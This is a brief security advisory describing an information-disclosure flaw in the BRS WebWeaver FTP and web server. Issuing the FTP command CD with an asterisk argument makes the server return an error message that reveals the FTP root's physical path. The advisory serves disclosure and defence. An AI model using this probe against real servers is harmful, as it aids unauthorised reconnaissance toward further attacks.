BRS WebWeaver is an ftpd and webserver from Blaine Southam.

WebWeaver's FTP component has a flaw which can permit a remote user to learn the physcial path to the FTP service's root directory.

By submitting the FTP command CD argumented by an asterisk character, the attacker can cause an error message to be generated by WebWeaver which includes the path for the ftp root.

Properly exploited, this information could assist a hostile user in carrying out other attacks on the system.
